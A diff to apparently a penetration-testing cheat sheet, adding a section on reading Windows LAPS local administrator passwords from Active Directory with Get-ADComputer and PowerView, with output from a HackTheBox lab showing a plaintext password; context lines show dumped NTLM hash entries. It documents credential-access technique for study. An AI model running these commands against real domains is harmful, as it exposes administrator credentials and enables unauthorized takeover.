@@ -106,3 +106,40 @@ tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 :1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 ```
+
+
+
+
+
+## Local Administrator Password Solution (LAPS)
+
+LAPS is a Windows service that randomizes and stores Local Admin passwords. It's granted to specific users that have access to Read / Write like regular files.
+
+If we have access to read LAPS we can extract the password as follows:
+
+```powershell
+PS> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+
+DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName       : dc01.timelapse.htb
+Enabled           : True
+ms-mcs-admpwd     : @yvkjZSgddd-t32UkJ-Z7wPL
+Name              : DC01
+ObjectClass       : computer
+ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName    : DC01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName :
+
+
+```
+
+
+
+### PowerView
+
+We can also view the LAPS password using PowerVIew.
+
+```powershell
+Get-DomainComputer "MachineName" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
+```
